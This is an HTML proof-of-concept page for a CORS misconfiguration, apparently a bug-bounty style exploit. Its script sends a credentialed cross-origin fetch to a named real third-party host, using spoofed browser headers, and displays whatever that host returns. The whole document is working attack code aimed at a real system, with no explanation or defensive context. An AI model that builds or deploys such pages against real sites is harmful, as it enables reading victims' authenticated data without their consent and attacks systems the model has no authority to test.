<!DOCTYPE html>
<html>
<head>
  <title>CORS Misconfiguration Proof of Concept</title>
</head>
<body>
  <h1>CORS Misconfiguration PoC</h1>
  <button id="exploitButton">Exploite</button>
  <div id="result"></div>

  <script>
    document.getElementById('exploitButton').onclick = function() {
      fetch('https://s7mbrstreamdual-ap.scene7.com/crossdomain.xml', {
        method: 'GET',
        headers: {
          'Accept-Encoding': 'gzip, deflate, br',
          'Accept': '*/*',
          'Accept-Language': 'en-US;q=0.9,en;q=0.8',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36',
          'Connection': 'close',
          'Cache-Control': 'max-age=0'
        },
        credentials: 'include'
      })
      .then(response => response.text())
      .then(data => {
        document.getElementById('result').innerText = data;
      })
      .catch(error => {
        console.error('Error:', error);
      });
    };
  </script>
</body>
</html>
